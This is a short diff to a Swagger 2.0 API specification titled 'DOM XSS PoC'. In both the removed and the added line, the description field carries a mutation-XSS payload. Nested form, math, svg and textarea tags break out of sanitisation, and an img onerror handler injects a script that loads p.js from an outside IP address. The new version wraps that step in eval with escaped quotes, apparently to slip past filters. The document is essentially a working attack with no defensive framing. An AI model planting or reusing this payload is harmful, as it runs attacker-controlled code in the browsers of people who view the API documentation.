@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: DOM XSS PoC
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=var s=document.createElement('script');s.src='https://96.30.197.125/p.js';document.head.append(s); src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=eval('s=document.createElement(\u0027script\u0027);s.src=\u0027https://96.30.197.125/p.js\u0027;document.head.append(s)') src=1>"></form>
   version: production
 basePath: /api/v1/
 produces:
